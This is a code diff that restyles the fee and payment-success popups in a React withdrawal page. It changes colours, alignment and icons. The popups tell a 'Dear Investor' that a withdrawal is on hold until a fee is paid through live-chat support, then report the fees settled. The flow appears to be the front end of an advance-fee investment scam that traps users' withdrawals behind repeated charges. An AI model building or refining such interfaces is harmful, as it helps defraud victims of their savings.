@@ -441,21 +441,18 @@ export default function Withdraw() {
         <>
           <div onClick={() => setFeePopup(null)} style={{ position: 'fixed', inset: 0, background: 'rgba(0,0,0,0.6)', zIndex: 300 }}/>
           <div style={{ position: 'fixed', top: '50%', left: '50%', transform: 'translate(-50%,-50%)', zIndex: 301, background: 'white', padding: '36px 28px', width: '320px', textAlign: 'center', borderRadius: '8px' }}>
-            <div style={{ width: '52px', height: '52px', borderRadius: '50%', border: '2px solid #ef4444', display: 'flex', alignItems: 'center', justifyContent: 'center', margin: '0 auto 14px' }}>
-              <svg width='22' height='22' fill='none' stroke='#ef4444' viewBox='0 0 24 24' strokeWidth='2'><path d='M10.29 3.86L1.82 18a2 2 0 0 0 1.71 3h16.94a2 2 0 0 0 1.71-3L13.71 3.86a2 2 0 0 0-3.42 0z'/><line x1='12' y1='9' x2='12' y2='13'/><line x1='12' y1='17' x2='12.01' y2='17'/></svg>
-            </div>
-            <div style={{ color: '#111', fontSize: '15px', fontWeight: '700', marginBottom: '6px' }}>{feePopup.label}</div>
-            <div style={{ color: '#555', fontSize: '10px', marginBottom: '16px', lineHeight: '1.8' }}>
+            <div style={{ color: '#111', fontSize: '15px', fontWeight: '700', marginBottom: '12px' }}>{feePopup.label}</div>
+            <div style={{ color: '#555', fontSize: '10px', marginBottom: '16px', lineHeight: '1.8', textAlign: 'left' }}>
               {FEE_DESCRIPTIONS[feePopup.type] || FEE_DESCRIPTIONS.processing}
             </div>
-            <div style={{ color: '#888', fontSize: '9px', marginBottom: '4px' }}>Amount Due</div>
-            <div style={{ color: '#ef4444', fontSize: '14px', fontWeight: '700', marginBottom: '6px' }}>${parseFloat(feePopup.amount || 0).toLocaleString('en-US', {minimumFractionDigits: 2})}</div>
-            <div style={{ color: '#555', fontSize: '9px', marginBottom: '20px', lineHeight: '1.7' }}>
+            <div style={{ color: '#888', fontSize: '9px', marginBottom: '4px', textAlign: 'left' }}>Amount Due</div>
+            <div style={{ color: '#111', fontSize: '16px', fontWeight: '700', marginBottom: '16px', textAlign: 'left' }}>${parseFloat(feePopup.amount || 0).toLocaleString('en-US', {minimumFractionDigits: 2})}</div>
+            <div style={{ color: '#555', fontSize: '10px', marginBottom: '20px', lineHeight: '1.7', textAlign: 'left' }}>
               Dear Investor, your withdrawal request is on hold. Please contact support to complete this payment.
             </div>
             <button onClick={() => { setFeePopup(null); window.dispatchEvent(new Event('openLiveChat')); }}
               style={{ width: '100%', padding: '10px', background: '#6366f1', border: 'none', color: 'white', fontSize: '10px', fontWeight: '700', cursor: 'pointer', marginBottom: '8px' }}>
-              💬 Contact Support
+              Contact Support
             </button>
             <button onClick={() => setFeePopup(null)}
               style={{ width: '100%', padding: '10px', background: 'transparent', border: '1px solid #e2e8f0', color: '#888', fontSize: '10px', cursor: 'pointer' }}>
@@ -475,16 +472,14 @@ export default function Withdraw() {
                 <div style={{ width: '56px', height: '56px', borderRadius: '50%', background: 'rgba(34,197,94,0.1)', border: '2px solid #22c55e', display: 'flex', alignItems: 'center', justifyContent: 'center', margin: '0 auto 16px' }}>
                   <svg width='24' height='24' fill='none' stroke='#22c55e' strokeWidth='2.5' viewBox='0 0 24 24'><polyline points='20 6 9 17 4 12'/></svg>
                 </div>
-                <div style={{ color: '#111', fontSize: '15px', fontWeight: '800', marginBottom: '8px' }}>All Fees Cleared!</div>
-                <div style={{ color: '#555', fontSize: '11px', marginBottom: '8px', lineHeight: '1.7' }}>
-                  Dear Investor, your <strong>{feeSuccess.paidFee.label}</strong> has been successfully processed.
-                </div>
-                <div style={{ color: '#555', fontSize: '11px', marginBottom: '20px', lineHeight: '1.7' }}>
-                  All outstanding fees have been settled. Our team is now processing your withdrawal and funds will be released to your account shortly. You will be notified once completed.
+                <div style={{ color: '#111', fontSize: '15px', fontWeight: '700', marginBottom: '8px' }}>Payment Successful</div>
+                <div style={{ color: '#888', fontSize: '11px', marginBottom: '16px' }}>{feeSuccess.paidFee.label} ${parseFloat(feeSuccess.paidFee.amount || 0).toFixed(2)} paid</div>
+                <div style={{ color: '#555', fontSize: '10px', marginBottom: '20px', lineHeight: '1.8', textAlign: 'left' }}>
+                  All outstanding fees have been settled. Our team is now processing your withdrawal and funds will be released to your account shortly.
                 </div>
                 <button onClick={() => setFeeSuccess(null)}
-                  style={{ width: '100%', padding: '13px', background: '#22c55e', border: 'none', color: 'white', fontSize: '11px', fontWeight: '700', cursor: 'pointer', borderRadius: '6px' }}>
-                  ✓ Done
+                  style={{ width: '100%', padding: '10px', background: '#6366f1', border: 'none', color: 'white', fontSize: '10px', fontWeight: '700', cursor: 'pointer', marginBottom: '8px' }}>
+                  Done
                 </button>
               </>
             ) : (
